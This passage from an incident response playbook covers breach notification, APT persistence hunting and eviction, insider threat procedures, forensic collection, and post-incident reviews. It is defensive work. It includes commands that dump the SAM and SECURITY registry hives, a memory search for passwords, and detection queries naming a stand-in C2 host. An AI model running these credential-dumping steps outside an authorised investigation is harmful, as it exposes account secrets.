### 5.6 Customer Notification and Credit Monitoring

**Notification letter must include:**
- What happened (clear, non-technical language)
- What information was involved
- What you are doing about it
- What they can do to protect themselves
- Contact information for questions
- Credit monitoring offer details (if applicable)

**Credit monitoring considerations:**
- Duration: 12-24 months standard, 36+ months for sensitive breaches
- Providers: Experian, TransUnion, Equifax, or bundled services (IdentityForce, Kroll)
- Cost per person: $10-25/month
- Total cost formula: affected_individuals × monthly_cost × months

### 5.7 Legal Holds

Upon confirming a data breach:

```
LEGAL HOLD NOTICE must be issued to:
  □ IT operations (preserve all logs, no routine deletion)
  □ Email administrators (preserve mailboxes of involved parties)
  □ Backup administrators (do not rotate/expire relevant backups)
  □ Cloud administrators (disable lifecycle policies on relevant storage)
  □ Security team (preserve all SIEM data, EDR telemetry)
  □ HR (preserve personnel records of involved employees)

  Duration: Until legal counsel lifts the hold
  Penalty for destruction: Spoliation sanctions, adverse inference, criminal liability
```

---

## 6. Playbook: Advanced Persistent Threat (APT)

### 6.1 Identifying Persistence Mechanisms

APT actors establish multiple persistence mechanisms to survive remediation attempts. Systematically check all categories:

**Windows persistence locations:**

```powershell
# Registry Run keys
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

# Scheduled tasks
Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'} |
  Select-Object TaskName, TaskPath, State,
    @{N='Actions';E={$_.Actions.Execute + " " + $_.Actions.Arguments}}

# Services (look for unusual names, descriptions, binary paths)
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike "*System32*"} |
  Select-Object Name, DisplayName, PathName, StartMode

# WMI event subscriptions (fileless persistence)
Get-WMIObject -Namespace root\Subscription -Class __EventFilter
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding

# DLL search order hijacking candidates
# Check unsigned DLLs in application directories
Get-ChildItem -Path "C:\Program Files" -Recurse -Filter "*.dll" |
  Get-AuthenticodeSignature |
  Where-Object {$_.Status -ne 'Valid'}
```

**Linux persistence locations:**

```bash
# Cron jobs (all users)
for user in $(cut -f1 -d: /etc/passwd); do
  echo "=== $user ===" ; crontab -u $user -l 2>/dev/null
done
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/

# Systemd services and timers
systemctl list-unit-files --type=service --state=enabled
systemctl list-timers --all

# SSH authorized keys
find / -name "authorized_keys" -exec echo "=== {} ===" \; -exec cat {} \; 2>/dev/null

# Modified binaries (compare to package manager)
rpm -Va 2>/dev/null | grep -v "^\.\.5"  # RPM-based
debsums -c 2>/dev/null                    # Debian-based

# Loadable kernel modules
lsmod | grep -v "^Module"
# Check for unsigned modules
cat /proc/modules | while read mod rest; do
  modinfo "$mod" 2>/dev/null | grep -q "sig_id" || echo "UNSIGNED: $mod"
done

# LD_PRELOAD and library injection
cat /etc/ld.so.preload 2>/dev/null
env | grep -i "ld_preload\|ld_library"
```

### 6.2 Mapping Attacker Infrastructure

Before eviction, map the full extent of compromise:

**Network infrastructure mapping:**
- All C2 channels (primary, backup, emergency)
- Exfiltration endpoints
- Staging servers (internal pivots)
- Jump boxes / compromised intermediaries

**Internal scope mapping:**

```bash
# EDR — Query for all systems communicating with known C2
# CrowdStrike Falcon example (Real Time Response):
runscript -CloudFile="Get-NetworkConnections" -CommandLine=""

# Elastic SIEM — Find all hosts with C2 indicators
GET _search
{
  "query": {
    "bool": {
      "should": [
        {"match": {"destination.ip": "198.51.100.50"}},
        {"match": {"dns.question.name": "update.evil-c2.example"}},
        {"match": {"process.hash.sha256": "a1b2c3d4..."}}
      ]
    }
  },
  "aggs": {
    "compromised_hosts": {
      "terms": {"field": "host.name", "size": 100}
    }
  }
}
```

### 6.3 Silent Monitoring Before Eviction

For APT actors, premature eviction results in re-compromise. The monitoring phase serves to:

1. Identify all persistence mechanisms before removing any
2. Understand the attacker's schedule (when they are active/inactive)
3. Document TTPs for attribution and intelligence sharing
4. Identify all compromised accounts and systems
5. Discover data staging and exfiltration methods

**Monitoring duration decision:**

| Factor | Favor Longer Monitoring | Favor Shorter Monitoring |
|--------|-------------------------|--------------------------|
| Data sensitivity | Low-sensitivity data at risk | Crown jewels being exfiltrated |
| Attacker activity | Dormant, checking in periodically | Actively moving laterally |
| Scope clarity | Unclear how many systems compromised | Scope well-mapped already |
| Eviction readiness | Not ready for coordinated eviction | All persistence identified |
| Legal/regulatory | No imminent notification deadline | Clock already ticking |

**Typical monitoring phase:** 2-4 weeks for sophisticated APT actors.

### 6.4 Coordinated Eviction

APT eviction must be simultaneous across all compromised systems. Staged eviction allows the attacker to observe the remediation and activate backup access.

**Eviction plan template:**

```
EVICTION D-DAY PLAN
====================
Target Date: [DATE]
Target Time: [TIME UTC] — choose attacker's inactive period
Duration:    Execution window 4 hours maximum

PRE-EVICTION (D-7 to D-1):
  □ All persistence mechanisms documented
  □ New, clean infrastructure prepared (clean AD, new DCs)
  □ New credentials generated (not yet deployed)
  □ Containment rules prepared (firewall, DNS, proxy)
  □ Communication plan for all stakeholders
  □ Rollback plan if eviction fails

SIMULTANEOUS ACTIONS (D-Day, T+0):
  □ Block all identified C2 at perimeter (firewall + DNS + proxy)
  □ Reset ALL domain accounts (krbtgt × 2, domain admin, service accounts)
  □ Disable identified persistence (scheduled tasks, services, WMI subs)
  □ Deploy clean GPOs to all systems
  □ Revoke all certificates issued during compromise period
  □ Reset/rebuild compromised systems from known-good images
  □ Deploy new network segmentation rules
  □ Enable enhanced monitoring (100% packet capture if feasible)

POST-EVICTION (D+1 to D+30):
  □ Monitor for re-entry attempts (24/7 watch)
  □ Validate no persistence survived
  □ Progressive restoration of normal operations
  □ Daily threat hunting sweeps for 30 days minimum
```

### 6.5 Re-Entry Prevention

After eviction:
- Change architecture, not just credentials (attacker knows your network)
- Implement zero-trust network access (ZTNA) for sensitive segments
- Deploy deception technology (honeypots, honeytokens, canary documents)
- Enhanced monitoring on previously compromised systems for 90+ days
- Geofencing on sensitive accounts (block access from attacker's region)
- Implement hardware security keys for privileged accounts

### 6.6 Threat Actor Attribution and TTP Documentation

Document findings using MITRE ATT&CK framework:

```
THREAT ACTOR PROFILE
====================
Internal Designation: [APT-YYYYMMDD-001]
Probable Attribution: [Group name if known]
Confidence Level:     [Low/Medium/High]

INITIAL ACCESS:
  - Technique: T1566.001 (Spearphishing Attachment)
  - Detail: Word document with VBA macro, delivered via
    compromised partner email account

EXECUTION:
  - Technique: T1059.001 (PowerShell)
  - Detail: Encoded PowerShell downloading second-stage from
    legitimate cloud service

PERSISTENCE:
  - Technique: T1053.005 (Scheduled Task)
  - Technique: T1546.003 (WMI Event Subscription)

PRIVILEGE ESCALATION:
  - Technique: T1068 (Exploitation for Privilege Escalation)
  - Detail: CVE-[YYYY]-[NNNN] local privilege escalation

LATERAL MOVEMENT:
  - Technique: T1021.002 (SMB/Windows Admin Shares)
  - Technique: T1021.001 (Remote Desktop Protocol)

COLLECTION:
  - Technique: T1560.001 (Archive via Utility — 7zip)

EXFILTRATION:
  - Technique: T1048.002 (Exfiltration Over Asymmetric Encrypted Non-C2)
  - Detail: Data staged in cloud storage, then synced to attacker-controlled account

INDICATORS OF COMPROMISE:
  - [SHA-256 hashes]
  - [Domains/IPs]
  - [File paths]
  - [Registry keys]
  - [YARA rules]
```

### 6.7 Intelligence Sharing

**Sharing venues:**
- ISACs (sector-specific: FS-ISAC, H-ISAC, E-ISAC, IT-ISAC)
- Law enforcement (FBI IC3, Europol EC3, national CERTs)
- MISP instances (community sharing)
- Trusted peer organizations (bilateral sharing)
- CISA (Automated Indicator Sharing via STIX/TAXII)

**TLP (Traffic Light Protocol) application:**
- **TLP:RED** — Specific to your organization, not for sharing outside core team
- **TLP:AMBER** — Limited sharing with organizations who need to know
- **TLP:AMBER+STRICT** — Only the recipient organization, not their customers/clients
- **TLP:GREEN** — Community-wide sharing within your sector
- **TLP:CLEAR** — Public information, no restrictions

---

## 7. Playbook: Insider Threat

### 7.1 Behavioral Indicators

**Pre-incident behavioral indicators (observable without technical monitoring):**

| Category | Indicators |
|----------|-----------|
| Disgruntlement | Vocal complaints, conflicts with management, disciplinary actions |
| Lifestyle changes | Unexplained wealth, financial pressure, substance issues |
| Work patterns | Working unusual hours, accessing areas without need, reluctance to take vacation |
| Social | Unexplained foreign contacts, social engineering other employees |
| Preparation | Copying policies/procedures excessively, studying security measures |
| Resignation indicators | Updating resume (LinkedIn activity), interviewing, giving notice |

**Technical indicators (from monitoring systems):**

| Category | Indicators |
|----------|-----------|
| Data access | Accessing data outside job role, bulk downloads, database dumps |
| Data movement | USB usage, personal cloud uploads, large email attachments, printing spikes |
| System access | Privilege escalation attempts, accessing admin tools, creating backdoor accounts |
| Evasion | Using VPN/Tor, clearing logs, disabling monitoring agents, encryption tool installation |
| Timing | Access during non-business hours, access from unusual locations |

### 7.2 HR/Legal Coordination Requirements

**Insider threat investigations are NOT purely technical.** Mandatory coordination:

```
BEFORE any monitoring beyond baseline security tools:
  □ HR notification and coordination
  □ Legal counsel approval (privacy law compliance)
  □ Executive sponsor notification (VP level or above)
  □ Document business justification for enhanced monitoring
  □ Verify compliance with:
    - Employment contracts
    - Acceptable use policy (what did employee consent to?)
    - Local privacy laws (GDPR Article 88, national labor law)
    - Works council/union agreements (if applicable in EU)
    - ECPA (US) or equivalent wiretap/surveillance law

DURING investigation:
  □ Limit knowledge to need-to-know basis
  □ Regular check-ins with legal on evidence admissibility
  □ HR involvement for any employment-impacting decisions
  □ Document everything contemporaneously

AFTER investigation:
  □ HR drives termination decision (not security team)
  □ Legal reviews evidence package before any action
  □ Coordinate timing of access revocation with HR notification
```

### 7.3 Evidence Collection with Chain of Custody

Insider cases frequently result in litigation (civil or criminal). Evidence standards are higher than typical IR:

**Evidence collection priorities:**
1. Preserve authentication/access logs (who, what, when, where)
2. Capture DLP alerts and data movement records
3. Preserve email (sent, received, deleted) via legal hold
4. Capture browser history and cloud access logs
5. USB device connection history
6. Badge access/physical security records
7. Endpoint forensic image (if warranted)

**Chain of custody requirements for insider cases:**

```
EVIDENCE TAG
============
Case ID:           INSIDER-2025-003
Item Number:       ITEM-007
Description:       Forensic image of laptop SN: ABC123DEF
Collected by:      [Name], [Title]
Collection date:   2025-05-07T14:30:00Z
Collection method: FTK Imager, booted from forensic USB, write-blocker connected
Hash (SHA-256):    a4b5c6d7e8f9...
Storage location:  Evidence locker Room 401, Shelf B, Position 3
Access restricted: IR team lead + legal counsel only

CUSTODY TRANSFERS:
Date/Time (UTC)    | From           | To              | Purpose        | Signature
2025-05-07 14:30   | [Collector]    | Evidence locker | Initial storage | [sig]
2025-05-08 09:00   | Evidence locker| [Analyst]       | Analysis        | [sig]
2025-05-08 17:00   | [Analyst]      | Evidence locker | End of day      | [sig]
```

### 7.4 User Activity Monitoring Data

Sources available for insider investigation (assuming appropriate legal authorization):

| Source | Data Available | Retention |
|--------|---------------|-----------|
| DLP (Data Loss Prevention) | File transfers, policy violations, content inspection | 90-365 days |
| CASB (Cloud Access Security Broker) | SaaS usage, cloud uploads/downloads, sharing | 90-180 days |
| Proxy/SWG logs | Web browsing, uploads, cloud storage access | 30-90 days |
| Email gateway | Sent/received metadata, attachments, content (with warrant) | 30-180 days |
| EDR telemetry | Process execution, file access, network connections | 30-90 days |
| Badge/physical access | Building entry/exit, restricted area access | 90-365 days |
| AD/IAM logs | Authentication, privilege changes, group membership | 90-365 days |
| Print logs | Documents printed, timestamps, printers used | 30-90 days |
| USB device logs | Connection events, device IDs, file operations | 30-90 days |

### 7.5 Distinguishing Malicious from Negligent Insider

| Dimension | Malicious Insider | Negligent Insider |
|-----------|-------------------|-------------------|
| Intent | Deliberate harm or personal gain | Careless, uninformed, expedient |
| Pattern | Systematic, planned, covering tracks | Random, ad-hoc, no concealment |
| Evasion | Active efforts to avoid detection | No evasion behaviors |
| Timing | Often before resignation/termination | Anytime, correlates with workload |
| Volume | Large, targeted data collection | Incidental, small-scale |
| Response | Disciplinary to criminal prosecution | Training, policy reminder, verbal warning |

**Critical distinction:** The technical investigation may not clearly distinguish intent. Never conclude malicious intent from technical evidence alone. HR and legal make the determination based on totality of circumstances.

### 7.6 Termination Procedures for Malicious Insider

When decision is made to terminate for malicious insider activity, timing and coordination are critical:

```
TERMINATION COORDINATION TIMELINE
==================================
All actions SIMULTANEOUS at T+0 (do not sequence — the insider may react):

T-24h (preparation, limited knowledge):
  □ HR prepares termination documentation
  □ Legal reviews evidence package and termination letter
  □ IT prepares access revocation scripts (DO NOT EXECUTE YET)
  □ Physical security prepares badge deactivation
  □ Manager briefed (2h before max, flight risk consideration)

T+0 (execution — all within 15-minute window):
  □ HR meeting with employee begins (ideally off-site or private room)
  □ SIMULTANEOUSLY: IT executes access revocation
    - Disable AD account
    - Revoke VPN certificates
    - Disable SSO access
    - Revoke cloud service tokens (OAuth)
    - Kill active sessions (all systems)
    - Disable MFA tokens
    - Block email access (preserve mailbox)
    - Revoke code repository access
  □ SIMULTANEOUSLY: Physical security
    - Deactivate badge
    - Alert reception/security desk
  □ SIMULTANEOUSLY: Endpoint
    - Remote lock company devices
    - Initiate remote wipe of mobile (after forensic data preserved)
  □ Manager collects company property (if in person)

T+1h:
  □ Verify no remaining access (test all systems)
  □ Monitor for attempted access from personal devices/IP
  □ Begin exit interview debrief (if employee cooperates)

T+24h:
  □ Change shared credentials the insider knew
  □ Rotate service account passwords they accessed
  □ Review access to partner/vendor systems
  □ Notify relevant third parties (if they had external access)
```

---

## 8. Digital Forensics Integration

### 8.1 Volatile Evidence Collection Order (RFC 3227)

Collect evidence in order of volatility — most volatile first, least volatile last:

```
Priority 1 (seconds lifespan): Registers, cache, running processes
Priority 2 (seconds-minutes): Network connections, ARP cache, routing tables
Priority 3 (minutes-hours):   Memory (RAM contents)
Priority 4 (hours-days):      Temporary files, swap space
Priority 5 (days-weeks):      Disk contents, file system metadata
Priority 6 (months-years):    Remote logging, backups, archives
Priority 7 (permanent):       Optical media, printouts, physical evidence
```

**Practical collection sequence for a compromised Windows system:**

```cmd
REM Step 1: Memory (highest priority)
winpmem_mini_x64.exe E:\evidence\%COMPUTERNAME%_memory.raw

REM Step 2: Network state
ipconfig /all > E:\evidence\%COMPUTERNAME%_ipconfig.txt
netstat -anob > E:\evidence\%COMPUTERNAME%_netstat.txt
arp -a > E:\evidence\%COMPUTERNAME%_arp.txt
route print > E:\evidence\%COMPUTERNAME%_routes.txt
nbtstat -S > E:\evidence\%COMPUTERNAME%_nbt.txt
net sessions > E:\evidence\%COMPUTERNAME%_sessions.txt
net use > E:\evidence\%COMPUTERNAME%_mapped_drives.txt

REM Step 3: Process information
tasklist /v /fo csv > E:\evidence\%COMPUTERNAME%_processes.csv
wmic process list full > E:\evidence\%COMPUTERNAME%_wmic_processes.txt

REM Step 4: User and system context
whoami /all > E:\evidence\%COMPUTERNAME%_whoami.txt
systeminfo > E:\evidence\%COMPUTERNAME%_systeminfo.txt
query user > E:\evidence\%COMPUTERNAME%_logged_users.txt

REM Step 5: Disk image (after volatile data captured)
REM Use FTK Imager CLI for disk image
ftkimager.exe \\.\PhysicalDrive0 E:\evidence\%COMPUTERNAME%_disk ^
  --e01 --compress 6 --frag 2G ^
  --case-number INC-2025-042 ^
  --evidence-number 001 ^
  --examiner "IR Team Lead"
```

**Practical collection sequence for a compromised Linux system:**

```bash
#!/bin/bash
# IR volatile collection script — run from USB/external media
EVIDENCE_DIR="/mnt/evidence/$(hostname)_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$EVIDENCE_DIR"

# Memory
echo "[*] Capturing memory..."
insmod /mnt/usb/tools/lime.ko "path=${EVIDENCE_DIR}/memory.lime format=lime"

# Network state
echo "[*] Capturing network state..."
ss -tupna > "${EVIDENCE_DIR}/ss_connections.txt"
ip addr show > "${EVIDENCE_DIR}/ip_addr.txt"
ip route show > "${EVIDENCE_DIR}/ip_route.txt"
ip neigh show > "${EVIDENCE_DIR}/arp_cache.txt"
iptables -L -n -v > "${EVIDENCE_DIR}/iptables.txt"
cat /proc/net/tcp > "${EVIDENCE_DIR}/proc_net_tcp.txt"

# Process information
echo "[*] Capturing process state..."
ps auxwwf > "${EVIDENCE_DIR}/ps_full.txt"
ls -la /proc/*/exe 2>/dev/null > "${EVIDENCE_DIR}/proc_exe_links.txt"
cat /proc/*/cmdline 2>/dev/null | tr '\0' ' ' > "${EVIDENCE_DIR}/proc_cmdline.txt"
ls -la /proc/*/fd/ 2>/dev/null > "${EVIDENCE_DIR}/proc_fd.txt"

# Loaded modules
lsmod > "${EVIDENCE_DIR}/lsmod.txt"

# User information
w > "${EVIDENCE_DIR}/logged_users.txt"
last -50 > "${EVIDENCE_DIR}/last_logins.txt"
cat /etc/passwd > "${EVIDENCE_DIR}/passwd.txt"

# Timestamps
find / -newer /tmp/.ir_marker -type f 2>/dev/null > "${EVIDENCE_DIR}/recent_files.txt"

# Hash everything collected
echo "[*] Computing hashes..."
sha256sum "${EVIDENCE_DIR}"/* > "${EVIDENCE_DIR}/SHA256SUMS.txt"
```

### 8.2 Memory Forensics — Volatility 3

Volatility 3 is the current-generation memory forensics framework. It replaces Volatility 2 (Python 2 based, legacy).

**Essential Volatility 3 commands:**

```bash
# List running processes
vol -f memory.raw windows.pslist.PsList
vol -f memory.raw windows.pstree.PsTree

# Detect hidden/terminated processes
vol -f memory.raw windows.psscan.PsScan

# Network connections (active and closed)
vol -f memory.raw windows.netscan.NetScan

# DLL list for suspicious process
vol -f memory.raw windows.dlllist.DllList --pid 4532

# Command line arguments
vol -f memory.raw windows.cmdline.CmdLine

# Detect code injection (hollowed processes)
vol -f memory.raw windows.malfind.Malfind

# Extract injected code for analysis
vol -f memory.raw windows.malfind.Malfind --pid 4532 --dump

# Dump specific process memory
vol -f memory.raw windows.memmap.Memmap --pid 4532 --dump

# Registry hive analysis
vol -f memory.raw windows.registry.hivelist.HiveList
vol -f memory.raw windows.registry.printkey.PrintKey \
  --key "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Handle analysis (open files, registry keys, mutexes)
vol -f memory.raw windows.handles.Handles --pid 4532

# Detect SSDT hooks (kernel-level rootkits)
vol -f memory.raw windows.ssdt.SSDT

# Extract files from memory
vol -f memory.raw windows.filescan.FileScan | grep -i "password\|credential"
vol -f memory.raw windows.dumpfiles.DumpFiles --physaddr 0x3e8a7890

# Linux memory analysis
vol -f memory.lime linux.pslist.PsList
vol -f memory.lime linux.bash.Bash          # Bash history in memory
vol -f memory.lime linux.check_syscall.Check_syscall  # Detect syscall hooks
```

**Key analysis workflow:**

```
1. Process analysis (pslist → pstree → psscan)
   - Look for: processes with no parent, misspelled system process names,
     processes running from unusual paths, hidden processes (in psscan but not pslist)

2. Network analysis (netscan)
   - Look for: connections to known C2, unusual listening ports,
     connections from unexpected processes

3. Code injection detection (malfind)
   - Look for: PAGE_EXECUTE_READWRITE memory regions,
     MZ headers in non-image memory, shellcode patterns

4. Persistence artifacts (registry, scheduled tasks in memory)
   - Cross-reference with disk forensics findings
```

### 8.3 Disk Forensics — Autopsy / FTK / X-Ways

**FTK Imager CLI — Evidence acquisition:**

```cmd
REM Create E01 (Expert Witness Format) forensic image
ftkimager \\.\PhysicalDrive0 D:\cases\case001\disk_image ^
  --e01 ^
  --case-number "INC-2025-042" ^
  --evidence-number "001" ^
  --description "Suspect workstation primary drive" ^
  --examiner "IR Analyst" ^
  --compress 6 ^
  --frag 2G ^
  --verify

REM Create logical image of specific volume
ftkimager \\.\C: D:\cases\case001\c_volume ^
  --e01 ^
  --case-number "INC-2025-042" ^
  --evidence-number "002"

REM Mount image read-only for analysis
ftkimager --list-drives
```

**Autopsy analysis workflow (open-source):**

```
1. Create new case → Add data source (E01/raw image)
2. Configure ingest modules:
   - Hash Lookup (NSRL to filter known-good)
   - Recent Activity (web, registry, USB)
   - Keyword Search (configure search terms relevant to case)
   - Email Parser
   - Extension Mismatch Detector
   - Interesting Files Identifier (configure patterns)
   - Embedded File Extractor
3. After ingest: Review timeline, artifacts, keyword hits
4. Export relevant artifacts with metadata
```

**Key disk artifacts — Windows:**

| Artifact | Location | Information |
|----------|----------|-------------|
| NTFS $MFT | \\$MFT | All file metadata, timestamps, resident data |
| $UsnJrnl | \\$Extend\\$UsnJrnl:$J | File system change journal |
| Prefetch | C:\Windows\Prefetch\*.pf | Program execution history (last 8 runs) |
| Shimcache | SYSTEM registry hive | Programs that existed on disk (not necessarily executed) |
| Amcache | C:\Windows\AppCompat\Programs\Amcache.hve | Program execution + metadata |
| Event logs | C:\Windows\System32\winevt\Logs\*.evtx | Security, system, application events |
| Registry hives | C:\Windows\System32\config\* | System configuration, user activity |
| NTUSER.DAT | C:\Users\*\NTUSER.DAT | Per-user registry (recent docs, typed URLs, MRU) |
| UsrClass.dat | C:\Users\*\AppData\Local\Microsoft\Windows\UsrClass.dat | Shellbags (folder access history) |
| $I30 | NTFS directory indexes | Deleted file evidence in directory entries |
| BITS | C:\ProgramData\Microsoft\Network\Downloader\* | Background transfer jobs (malware delivery) |
| SRUM | C:\Windows\System32\sru\SRUDB.dat | Resource usage per application/network |

### 8.4 Network Forensics

**Full packet capture analysis with Zeek:**

```bash
# Process PCAP through Zeek for structured logs
zeek -r incident_capture.pcap

# Resulting log files:
# conn.log — All connections (source, dest, ports, bytes, duration)
# dns.log — DNS queries and responses
# http.log — HTTP requests and responses
# ssl.log — TLS handshakes (SNI, certificate info)
# files.log — Files transferred over network
# notice.log — Zeek-detected anomalies

# Find data exfiltration candidates (large outbound transfers)
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p orig_bytes |
  awk -F'\t' '$4 > 50000000' | sort -t$'\t' -k4 -rn

# DNS tunneling detection (high-entropy, long subdomain queries)
cat dns.log | zeek-cut query |
  awk '{if(length($1) > 50) print length($1), $1}' |
  sort -rn | head -30

# Extract suspicious files from PCAP
zeek -r capture.pcap /opt/zeek/share/zeek/policy/frameworks/files/extract-all-files.zeek
# Files saved to: extract_files/

# TLS certificate analysis (identify C2 with self-signed or unusual certs)
cat ssl.log | zeek-cut id.resp_h server_name issuer subject validation_status |
  grep -v "ok" | sort -u
```

**tcpdump targeted capture during live incident:**

```bash
# Capture all traffic to/from suspected C2
tcpdump -i eth0 host 198.51.100.50 -w /evidence/c2_traffic.pcap -G 3600 -W 24

# Capture DNS for exfiltration detection
tcpdump -i eth0 port 53 -w /evidence/dns_traffic.pcap

# Capture specific subnet lateral movement
tcpdump -i eth0 net 10.0.5.0/24 and port 445 -w /evidence/smb_lateral.pcap
```

### 8.5 Timeline Analysis — Plaso / log2timeline

Plaso (log2timeline) creates super-timelines from multiple evidence sources, correlating events across different artifact types.

```bash
# Step 1: Parse evidence sources into Plaso storage
log2timeline.py --storage-file case001.plaso /evidence/disk_image.E01

# For memory dump artifacts
log2timeline.py --storage-file case001.plaso --parsers "volatility" /evidence/memory.raw

# Step 2: Filter and export timeline
psort.py -o l2tcsv -w timeline.csv case001.plaso \
  --slice "2025-04-15T00:00:00" --slice_size 604800

# Step 3: Filter for specific timeframe and artifact types
psort.py -o l2tcsv -w filtered_timeline.csv case001.plaso \
  "date > '2025-04-10 00:00:00' AND date < '2025-04-20 23:59:59'"

# Step 4: Target specific parsers for faster processing
log2timeline.py --parsers "winevtx,prefetch,mft,usnjrnl,shimcache" \
  --storage-file targeted.plaso /evidence/disk_image.E01
```

**Timeline analysis approach:**

```
1. Identify anchor events (known-bad timestamps from detection)
2. Work backward: How did the attacker get here?
   - Authentication events before known-bad activity
   - File creation/modification before execution
   - Network connections before data access
3. Work forward: What else did they do?
   - Lateral movement after initial compromise
   - Data access after privilege escalation
   - Exfiltration after data staging
4. Identify gaps: What evidence is missing or was destroyed?
5. Correlate across sources:
   - SIEM alert timestamp ↔ disk artifact timestamp ↔ memory artifact
```

### 8.6 Artifact Extraction — Windows Deep Dive

**Registry forensics:**

```powershell
# Export all hives for offline analysis (from live system)
reg save HKLM\SYSTEM C:\evidence\SYSTEM_hive
reg save HKLM\SOFTWARE C:\evidence\SOFTWARE_hive
reg save HKLM\SAM C:\evidence\SAM_hive
reg save HKLM\SECURITY C:\evidence\SECURITY_hive

# RegRipper for automated artifact extraction
rip.pl -r SYSTEM_hive -p compname     # Computer name
rip.pl -r SYSTEM_hive -p nic2         # Network interfaces
rip.pl -r SYSTEM_hive -p shimcache    # Shimcache entries
rip.pl -r SYSTEM_hive -p services     # Services
rip.pl -r SOFTWARE_hive -p run        # Run keys
rip.pl -r SOFTWARE_hive -p uninstall  # Installed software
rip.pl -r NTUSER.DAT -p userassist    # UserAssist (program execution)
rip.pl -r NTUSER.DAT -p typedurls     # Typed URLs
rip.pl -r NTUSER.DAT -p recentdocs    # Recent documents
```

**Windows Event Log analysis (key Event IDs):**

| Event ID | Log | Significance |
|----------|-----|-------------|
| 4624 | Security | Successful logon (check logon type) |
| 4625 | Security | Failed logon |
| 4648 | Security | Logon using explicit credentials (pass-the-hash indicator) |
| 4672 | Security | Special privileges assigned (admin logon) |
| 4688 | Security | Process creation (with command line if auditing enabled) |
| 4698/4699 | Security | Scheduled task created/deleted |
| 4720 | Security | User account created |
| 4732 | Security | Member added to security group |
| 7045 | System | New service installed |
| 1102 | Security | Audit log cleared (anti-forensics) |
| 4104 | PowerShell/Operational | PowerShell script block logging |
| 4103 | PowerShell/Operational | PowerShell module logging |
| 1 | Sysmon | Process creation (enhanced with hash, parent process) |
| 3 | Sysmon | Network connection |
| 7 | Sysmon | Image loaded (DLL loading) |
| 8 | Sysmon | CreateRemoteThread (injection indicator) |
| 11 | Sysmon | File created |
| 13 | Sysmon | Registry value set |
| 22 | Sysmon | DNS query |

**Prefetch analysis:**

```bash
# Using PECmd (Eric Zimmerman's tools)
PECmd.exe -d C:\Windows\Prefetch --csv C:\evidence\prefetch_output

# Key information from prefetch:
# - Executable name and path
# - First and last 8 execution timestamps
# - Referenced files/DLLs (loaded during execution)
# - Volume information
```

**Shimcache and Amcache:**

```bash
# Shimcache parsing (AppCompatCacheParser — Eric Zimmerman)
AppCompatCacheParser.exe -f SYSTEM_hive --csv C:\evidence\shimcache_output

# Amcache parsing
AmcacheParser.exe -f Amcache.hve --csv C:\evidence\amcache_output
# Amcache provides: SHA-1 hash, full path, file size, compile time, publisher
```

---

## 9. Post-Incident Activities

### 9.1 Lessons Learned Meeting Format

Schedule within 1-2 weeks of incident closure (not longer — memories fade).

**Meeting structure (90-120 minutes):**

```
AGENDA
======
1. Introduction and ground rules (5 min)
   - Blameless culture explicitly stated
   - Focus on process and systems, not individuals
   - All observations valued regardless of role/seniority

2. Incident timeline review (20 min)
   - Walk through factual timeline
   - Clarify any disputed facts
   - Identify key decision points

3. What went well (15 min)
   - Identify effective responses
   - Recognize successful procedures
   - Note tools/processes that worked as designed

4. What could be improved (30 min)
   - Detection gaps
   - Communication breakdowns
   - Tool limitations
   - Procedure gaps or unclear procedures
   - Resource constraints
   - Training needs identified

5. Root cause analysis (20 min)
   - Use structured technique (5 Whys or Ishikawa)
   - Distinguish proximate cause from root cause
   - Identify systemic factors

6. Action items (20 min)
   - Specific, measurable improvements
   - Assigned owner for each
   - Deadline for each
   - Priority ranking

7. Wrap-up (5 min)
   - Confirm action item owners and deadlines
   - Schedule follow-up review (30 days)
```

### 9.2 Root Cause Analysis Techniques

**5 Whys — Example:**

```
Problem: Ransomware encrypted 200 file server shares

Why 1: Ransomware deployed via Group Policy Object
Why 2: Attacker had Domain Admin credentials
Why 3: Attacker compromised IT admin via spearphishing
Why 4: IT admin clicked malicious link in email
Why 5: No phishing-resistant MFA was in place for privileged accounts

Root Cause: Lack of phishing-resistant MFA (hardware tokens/FIDO2) for
            privileged accounts allowed credential theft via phishing

Remediation: Implement FIDO2 hardware keys for all Tier 0/1 administrators
```

**Ishikawa (Fishbone) Diagram — Categories for IR:**

```
                    ┌────────────────────────────────────────┐
                    │         INCIDENT ROOT CAUSE             │
                    └──────────────────┬─────────────────────┘
                                       │
    ┌──────────┐  ┌──────────┐  ┌─────┴─────┐  ┌──────────┐  ┌──────────┐
    │ People   │  │ Process  │  │ Technology │  │ Policy   │  │ External │
    └────┬─────┘  └────┬─────┘  └─────┬─────┘  └────┬─────┘  └────┬─────┘
         │              │              │              │              │
  Training gaps   No playbook   Missing patches  Weak password   APT group
  Understaffing   No escalation EDR coverage gap   policy        Supply chain
  Fatigue/burnout Unclear roles Legacy systems   No MFA mandate  Zero-day
  Skill mismatch  No testing    Alert fatigue    Audit failure   Partner breach
```

**Fault Tree Analysis (for complex incidents):**

```
                    [Data Breach Occurred]
                           │
                    ┌──────┴──────┐
                  AND              │
            ┌─────┴─────┐         │
      [Attacker gained] [Data was]
      [access to data ] [exfiltrable]
            │                     │
      ┌─────┴─────┐        ┌─────┴─────┐
     OR            │       OR            │
  ┌──┴───┐   ┌────┴────┐ ┌──┴──┐  ┌────┴────┐
[Phished][VPN[No network [No DLP] [No egress
 creds]  0-day]segment]          filtering]
```

### 9.3 IR Report Writing

**Report structure:**

```
INCIDENT RESPONSE REPORT
========================

Document Control:
  Report ID:        IR-2025-042-FINAL
  Classification:   TLP:AMBER
  Author:           [IR Lead]
  Review date:      [date]
  Distribution:     [list]

EXECUTIVE SUMMARY (1 page maximum)
  - What happened (2-3 sentences, non-technical)
  - Business impact (quantified where possible)
  - Current status (resolved/ongoing)
  - Key recommendations (top 3)

INCIDENT OVERVIEW
  - Classification: [category, severity]
  - Detection: [how, when, by whom]
  - Duration: [first evidence of compromise → full containment]
  - Scope: [systems, data, users affected]
